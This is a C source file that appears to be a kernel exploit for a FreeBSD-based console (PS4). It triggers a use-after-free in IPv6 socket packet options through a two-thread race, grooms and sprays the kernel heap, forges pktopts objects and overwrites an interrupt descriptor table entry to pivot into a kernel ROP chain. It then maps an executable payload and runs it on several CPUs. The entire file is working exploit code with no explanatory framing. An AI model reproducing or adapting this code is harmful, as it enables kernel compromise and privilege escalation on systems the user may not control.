#include <sys/types.h>
#include <stdio.h>
#include <sys/socket.h>
#include <sys/param.h>
#include <sys/cpuset.h>
#include <netinet/in.h>
#include <netinet/ip6.h>
#include <netinet6/ip6_var.h>
#include <unistd.h>
#include <time.h>
#include <errno.h>
#include <sys/mman.h>
#include <string.h>
#include <printf/printf.h>
#include <librop/pthread_create.h>
#include <ps4/errno.h>

#define IPV6_2292PKTINFO 19
#define IPV6_2292PKTOPTIONS 25
#define TCLASS_MASTER 0x13370000
#define TCLASS_SPRAY 0x41
#define TCLASS_TAINT 0x42
#define SPRAY_SIZE 32
#define SPRAY_TOTAL 320
#define NEW_SOCKET() socket(AF_INET6, SOCK_DGRAM, 0)

#define NANOSLEEP_100US "\0\0\0\0\0\0\0\0\xa0\x86\x01\0\0\0\0\0"
#define NANOSLEEP_75US  "\0\0\0\0\0\0\0\0\xf8\x24\x01\0\0\0\0\0"
#define NANOSLEEP_50US  "\0\0\0\0\0\0\0\0\x50\xc3\0\0\0\0\0\0"
#define NANOSLEEP_10US  "\0\0\0\0\0\0\0\0\x10\x27\0\0\0\0\0\0"

#define MAX_ATTEMPTS 20
#define HEAP_GROOM_COUNT 100
#define MAX_TRIES 500

#define DEFRAG_PASSES 3
#define DEFRAG_SMALL_SOCKETS 16
#define DEFRAG_LARGE_SOCKETS 32
#define PKTOPTS_OBJ_SIZE 0x60

#define set_pktopts(s, buf, len) setsockopt(s, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, buf, len)
#define set_rthdr(s, buf, len) setsockopt(s, IPPROTO_IPV6, IPV6_RTHDR, buf, len)
#define free_pktopts(s) set_pktopts(s, NULL, 0)
#define set_pktinfo(s, buf) setsockopt(s, IPPROTO_IPV6, IPV6_PKTINFO, buf, sizeof(struct in6_pktinfo))

#define PKTOPTS_PKTINFO_OFFSET (offsetof(struct ip6_pktopts, ip6po_pktinfo))
#define PKTOPTS_RTHDR_OFFSET (offsetof(struct ip6_pktopts, ip6po_rhinfo.ip6po_rhi_rthdr))
#define PKTOPTS_TCLASS_OFFSET (offsetof(struct ip6_pktopts, ip6po_tclass))

// Reusable socket cache
#define SOCKET_CACHE_SIZE 64

static int socket_cache[SOCKET_CACHE_SIZE];
static int socket_cache_count = 0;
static int socket_cache_initialized = 0;

// Start socket cache with -1
void init_socket_cache(void)
{
    for (int i = 0; i < SOCKET_CACHE_SIZE; ++i) {
        socket_cache[i] = -1;
    }

    socket_cache_count = 0;
    socket_cache_initialized = 1;
}

void reset_ipv6_opts(int s) {
    static const int tclass = -1;
    static const struct in6_pktinfo z = {0};

    setsockopt(s, IPPROTO_IPV6, IPV6_TCLASS, &tclass, sizeof(tclass));
    setsockopt(s, IPPROTO_IPV6, IPV6_RTHDR, NULL, 0);
    setsockopt(s, IPPROTO_IPV6, IPV6_PKTINFO, &z, sizeof(z));
}

void safe_close_socket(int sock) {
    if (sock >= 0) {
        reset_ipv6_opts(sock);
        shutdown(sock, SHUT_RDWR);
        close(sock);
    }
}

// Use socket cache if available
int fast_new_socket(void) {
    if (!socket_cache_initialized) {
        init_socket_cache();
    }

    if (socket_cache_count > 0) {
        int sock = socket_cache[--socket_cache_count];
        socket_cache[socket_cache_count] = -1;
        return sock;
    }

    return NEW_SOCKET();
}

// Store socket cache
void cache_socket(int sock) {
    if (sock < 0) {
        return;
    }

    if (!socket_cache_initialized) {
        init_socket_cache();
    }

    reset_ipv6_opts(sock);

    if (socket_cache_count < SOCKET_CACHE_SIZE) {
        socket_cache[socket_cache_count++] = sock;
    } else {
        safe_close_socket(sock);
    }
}

// Clear Cache
void flush_socket_cache(void) {
    if (!socket_cache_initialized) {
        return;
    }

    while (socket_cache_count > 0) {
        int sock = socket_cache[--socket_cache_count];

        if (sock >= 0) {
            safe_close_socket(sock);
        }

        socket_cache[socket_cache_count] = -1;
    }
}


#define GET_TCLASS(name) \
int name(int s) { \
    int v; \
    socklen_t l = sizeof(v); \
    if (getsockopt(s, IPPROTO_IPV6, IPV6_TCLASS, &v, &l)) \
        *(volatile int*)0; \
    return v; \
}

GET_TCLASS(get_tclass)
GET_TCLASS(get_tclass_2)
GET_TCLASS(get_tclass_3)

int set_tclass(int s, int val) {
    return setsockopt(s, IPPROTO_IPV6, IPV6_TCLASS, &val, sizeof(val)) ? (*(volatile int*)0) : 0;
}

int get_pktinfo(int s, char* buf) {
    socklen_t l = sizeof(struct in6_pktinfo);
    return getsockopt(s, IPPROTO_IPV6, IPV6_PKTINFO, buf, &l) ? (*(volatile int*)0) : l;
}

typedef struct {
    int master_sock;
    int kevent_sock;
    int* spray_sock;
    int spray_count;
} exploit_state_t;

void comprehensive_cleanup(exploit_state_t* state) {
    flush_socket_cache();

    for (int i = 0; i < state->spray_count; i++) {
        if (state->spray_sock[i] >= 0) {
            reset_ipv6_opts(state->spray_sock[i]);
            shutdown(state->spray_sock[i], SHUT_RDWR);
            close(state->spray_sock[i]);
            state->spray_sock[i] = -1;
        }
    }

    safe_close_socket(state->master_sock);
    safe_close_socket(state->kevent_sock);
    state->master_sock = -1;
    state->kevent_sock = -1;

    nanosleep(NANOSLEEP_100US, NULL);
}


struct opaque {
    volatile int triggered;
    volatile int padding;
    volatile int done1;
    volatile int done2;
    int master_sock;
    int kevent_sock;
    int* spray_sock;
};

void pin_to_cpu(int cpu) {
    cpuset_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_PID, getpid(), sizeof(set), &set);
}

void* use_thread(void* arg) {
    struct opaque* o = (struct opaque*)arg;
    char buf[CMSG_SPACE(sizeof(int))] = {0};

    ((struct cmsghdr*)buf)->cmsg_len = CMSG_LEN(sizeof(int));
    ((struct cmsghdr*)buf)->cmsg_level = IPPROTO_IPV6;
    ((struct cmsghdr*)buf)->cmsg_type = IPV6_TCLASS;
    *(int*)CMSG_DATA((struct cmsghdr*)buf) = 0;

    while (!*(volatile int*)&o->triggered &&
           get_tclass_2(o->master_sock) != TCLASS_SPRAY) {
        set_pktopts(o->master_sock, buf, sizeof(buf));
    }

    *(volatile int*)&o->triggered = 1;
    *(volatile int*)&o->done1 = 1;

    return NULL;
}

void* free_thread(void* arg) {
    struct opaque* o = (struct opaque*)arg;

    while (!o->triggered && get_tclass_3(o->master_sock) != TCLASS_SPRAY) {
        if (free_pktopts(o->master_sock))
            *(volatile int*)0;

        nanosleep(NANOSLEEP_100US, NULL);
    }

    o->triggered = 1;
    o->done2 = 1;
    return NULL;
}

void trigger_uaf(struct opaque* o) {
    pin_to_cpu(1);

    o->triggered = o->padding = o->done1 = o->done2 = 0;

    pthread_t th1, th2;
    pthread_create(&th1, NULL, use_thread, o);
    pthread_create(&th2, NULL, free_thread, o);

    nanosleep(NANOSLEEP_50US, NULL); // Critical timing window for race condition

    int attempts = 0;
    const int MAX_SPRAY = SPRAY_SIZE;

    while (attempts++ < 1000) {
        for (int i = 0; i < MAX_SPRAY; i++) {
            if (set_tclass(o->spray_sock[i], TCLASS_SPRAY))
                reset_ipv6_opts(o->spray_sock[i]);
        }

        if (get_tclass(o->master_sock) == TCLASS_SPRAY)
            break;

        if (!o->triggered) {
            for (int i = 0; i < MAX_SPRAY; i++) {
                free_pktopts(o->spray_sock[i]);
            }
        }

        nanosleep(NANOSLEEP_100US, NULL);
    }

    o->triggered = 1;

    for (int wait = 0; wait < 100 && (!o->done1 || !o->done2); wait++) {
        nanosleep(NANOSLEEP_100US, NULL);
    }
}

int build_rthdr_msg(char* buf, int size) {
    int len = ((size / 8) - 1) & ~1;
    size = (len + 1) * 8;
    struct ip6_rthdr* rthdr = (struct ip6_rthdr*)buf;
    rthdr->ip6r_nxt = 0;
    rthdr->ip6r_len = len;
    rthdr->ip6r_type = IPV6_RTHDR_TYPE_0;
    rthdr->ip6r_segleft = rthdr->ip6r_len / 2;
    return size;
}

int fake_pktopts(struct opaque* o, int overlap_sock, int tclass0, unsigned long long pktinfo) {
    free_pktopts(overlap_sock);
    char buf[0x100] = {0};
    int l = build_rthdr_msg(buf, 0x100);
    int tclass;
    int found = 0;

    unsigned long long* pktinfo_ptr = (unsigned long long*)(buf + PKTOPTS_PKTINFO_OFFSET);
    unsigned int* tclass_ptr = (unsigned int*)(buf + PKTOPTS_TCLASS_OFFSET);

    int tries = 0;

    while (tries++ < MAX_TRIES) {
        *pktinfo_ptr = pktinfo;

        for (int i = 0; i < SPRAY_SIZE; i++) {
            *tclass_ptr = tclass0 | i;
            if (set_rthdr(o->spray_sock[i], buf, l))
                *(volatile int*)0;
        }

        tclass = get_tclass(o->master_sock);
        if ((tclass & 0xffff0000) == tclass0) {
            found = 1;
            break;
        }

        for (int i = 0; i < SPRAY_SIZE; i++)
            set_rthdr(o->spray_sock[i], NULL, 0);
    }

    if (!found)
        return -1;

    return tclass & 0xffff;
}

unsigned long long __builtin_gadget_addr(const char*);
unsigned long long rop_call_funcptr(void(*)(void*), ...);

void sidt(unsigned long long* addr, unsigned short* size) {
    char buf[10];
    unsigned long long ropchain[14] = {
        __builtin_gadget_addr("mov rax, [rdi]"),
        __builtin_gadget_addr("pop rsi"),
        (unsigned long long)(ropchain + 13),
        __builtin_gadget_addr("mov [rsi], rax"),
        __builtin_gadget_addr("pop rsi"),
        ~7ul,
        __builtin_gadget_addr("sub rdi, rsi ; mov rdx, rdi"),
        __builtin_gadget_addr("mov rax, [rdi]"),
        __builtin_gadget_addr("pop rcx"),
        0x7d,
        __builtin_gadget_addr("add rax, rcx"),
        __builtin_gadget_addr("sidt [rax - 0x7d]"),
        __builtin_gadget_addr("pop rsp"),
        0
    };
    ((void(*)(char*))ropchain)(buf);
    *size = *(unsigned short*)buf;
    *addr = *(unsigned long long*)(buf + 2);
}


void flush_ipv6_option_pools() {
    int flush_sockets[128];

    for (int i = 0; i < 128; i++) {
        flush_sockets[i] = fast_new_socket();
        if (flush_sockets[i] >= 0) {
            char dummy[256] = {0};
            setsockopt(flush_sockets[i], IPPROTO_IPV6, IPV6_TCLASS, dummy, sizeof(int));
            set_pktopts(flush_sockets[i], dummy, 32);
            set_rthdr(flush_sockets[i], dummy, 64);
            reset_ipv6_opts(flush_sockets[i]);
        }
    }

    nanosleep(NANOSLEEP_10US, NULL);

    for (int i = 127; i >= 0; i--) {
        if (flush_sockets[i] >= 0)
            cache_socket(flush_sockets[i]);
    }

    nanosleep(NANOSLEEP_10US, NULL);
}


int verify_idt(void) {
    unsigned long long current_base;
    unsigned short current_size;
    sidt(&current_base, &current_size);
    return (current_size >= 0xFF && current_base != 0);
}


void targeted_heap_defragmentation(void) {
    char pktopts_buf[PKTOPTS_OBJ_SIZE] = {0};
    char pressure_buf[PKTOPTS_OBJ_SIZE] = {0};

    for (int pass = 0; pass < DEFRAG_PASSES; pass++) {
        int defrag_small[DEFRAG_SMALL_SOCKETS];
        int defrag_large[DEFRAG_LARGE_SOCKETS];

        for (int i = 0; i < DEFRAG_SMALL_SOCKETS; i++) {
            defrag_small[i] = fast_new_socket();
            if (defrag_small[i] >= 0) {
                set_pktopts(defrag_small[i], pktopts_buf, PKTOPTS_OBJ_SIZE);
                set_rthdr(defrag_small[i], pktopts_buf, PKTOPTS_OBJ_SIZE);
            }
        }

        for (int i = 0; i < DEFRAG_LARGE_SOCKETS; i++) {
            defrag_large[i] = fast_new_socket();
            if (defrag_large[i] >= 0) {
                setsockopt(defrag_large[i], IPPROTO_IPV6,
                           IPV6_2292PKTOPTIONS, pressure_buf, PKTOPTS_OBJ_SIZE);
            }
        }

        nanosleep(NANOSLEEP_10US, NULL);

        for (int i = DEFRAG_LARGE_SOCKETS - 1; i >= 0; i--) {
            if (defrag_large[i] >= 0) {
                cache_socket(defrag_large[i]);
                defrag_large[i] = -1;
            }
        }

        nanosleep(NANOSLEEP_10US, NULL);

        for (int i = 0; i < DEFRAG_SMALL_SOCKETS; i++) {
            if (defrag_small[i] >= 0) {
                cache_socket(defrag_small[i]);
                defrag_small[i] = -1;
            }
        }
    }
}

void (*enter_krop)(void);
extern uint64_t krop_idt_base;
extern uint64_t krop_jmp_crash;
extern uint64_t krop_ud1;
extern uint64_t krop_ud2;
extern uint64_t krop_read_cr0;
extern uint64_t krop_read_cr0_2;
extern uint64_t krop_write_cr0;
extern uint64_t krop_c3bak1;
extern uint64_t krop_c3bak2;
extern uint64_t krop_kernel_base;
extern uint64_t krop_master_sock;
extern char spray_bin[];
extern char spray_end[];

int main() {
    init_socket_cache();

    if (!setuid(0))
        return 179;

    int init_socks[16];
    for (int i = 0; i < 16; i++)
        init_socks[i] = NEW_SOCKET();

    uint64_t idt_base;
    uint16_t idt_size;
    sidt(&idt_base, &idt_size);

    krop_idt_base = idt_base;
    uint64_t kernel_base = idt_base - 0x1bbb9e0;
    krop_kernel_base = kernel_base;
    krop_jmp_crash = kernel_base + 0x1c0;
    krop_read_cr0 = kernel_base + 0xa1b70;
    krop_read_cr0_2 = kernel_base + 0xa1b70;
    krop_write_cr0 = kernel_base + 0xa1b79;

    int kevent_sock = NEW_SOCKET();
    int master_sock = NEW_SOCKET();
    krop_master_sock = master_sock * 8;

    // Phase 1 - Heap grooming
    for (int i = 0; i < HEAP_GROOM_COUNT; i++) {
        int s = NEW_SOCKET();
        if (s >= 0) {
            reset_ipv6_opts(s);
            safe_close_socket(s);
        }
        if (i % 10 == 0)
            nanosleep(NANOSLEEP_10US, NULL);
    }
	
	// Close initial 16 sockets for increased socket availability
	for (int i = 0; i < 16; i++)
    if (init_socks[i] >= 0) safe_close_socket(init_socks[i]);

    // Phase 2 - SPRAY
    int spray_sock[SPRAY_TOTAL];
    for (int i = 0; i < SPRAY_TOTAL; i++) {
        spray_sock[i] = NEW_SOCKET();
        if (spray_sock[i] < 0)
            *(volatile int*)0;
    }

    exploit_state_t cleanup_state = {
        .master_sock = master_sock,
        .kevent_sock = kevent_sock,
        .spray_sock = spray_sock,
        .spray_count = SPRAY_TOTAL
    };

    struct opaque o = {
        .master_sock = master_sock,
        .kevent_sock = kevent_sock,
        .spray_sock = spray_sock
    };

    int exploit_success = 0;

    for (int attempts = 0; attempts < MAX_ATTEMPTS; attempts++) {
        int overlap_idx = -1;

        for (int i = 0; i < SPRAY_SIZE; i++) {
            reset_ipv6_opts(spray_sock[i]);
        }

        // Phase 3 - DEFRAG
        targeted_heap_defragmentation();

        trigger_uaf(&o);
        set_tclass(master_sock, TCLASS_TAINT);

        for (int i = 0; i < SPRAY_SIZE; i++) {
            if (get_tclass(spray_sock[i]) == TCLASS_TAINT) {
                overlap_idx = i;
                break;
            }
        }

        if (overlap_idx < 0)
            continue;

        int overlap_sock = spray_sock[overlap_idx];
        cache_socket(overlap_sock);
        spray_sock[overlap_idx] = NEW_SOCKET();
        if (spray_sock[overlap_idx] < 0)
            *(volatile int*)0;

        overlap_idx = fake_pktopts(&o, overlap_sock, TCLASS_MASTER, idt_base + 0xc2c);
        if (overlap_idx < 0)
            continue;

        overlap_sock = spray_sock[overlap_idx];
        cache_socket(overlap_sock);
        spray_sock[overlap_idx] = NEW_SOCKET();
        if (spray_sock[overlap_idx] < 0)
            *(volatile int*)0;

        char buf[32];
        get_pktinfo(master_sock, buf);

        uint64_t entry_gadget = __builtin_gadget_addr("$ pivot_addr");

        *(uint16_t*)(buf + 4) = (uint16_t)entry_gadget;
        *(uint64_t*)(buf + 10) = entry_gadget >> 16;
        buf[9] = 0xee;

        krop_c3bak1 = *(uint64_t*)(buf + 4);
        krop_c3bak2 = *(uint64_t*)(buf + 12);
        krop_ud1 = *(uint64_t*)(buf + 4);
        krop_ud2 = *(uint64_t*)(buf + 12);

        set_pktinfo(master_sock, buf);

        if (!verify_idt()) continue;

        enter_krop();

        if (!verify_idt()) continue;

        exploit_success = 1;
        nanosleep(NANOSLEEP_50US, NULL);
        break;
    }

    char* spray_start = spray_bin;
    char* spray_stop = spray_end;
    size_t spray_size = spray_stop - spray_start;

    if (spray_size == 0 || spray_size > 0x10000)
        *(volatile int*)0;

    char* spray_map = mmap(0, spray_size, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, -1, 0);
    if (spray_map == MAP_FAILED)
        *(volatile int*)0;

    for (size_t i = 0; i < spray_size; i++) {
        spray_map[i] = spray_bin[i];
    }

    if (exploit_success) {
        pin_to_cpu(2);
        rop_call_funcptr(spray_map, spray_sock, kernel_base);

        for (int cpu = 3; cpu <= 7; cpu++) {
            pin_to_cpu(cpu);
            rop_call_funcptr(spray_map, NULL, kernel_base);
        }

        nanosleep(NANOSLEEP_50US, NULL);

    }

    comprehensive_cleanup(&cleanup_state);

    return exploit_success ? 0 : 1;
}
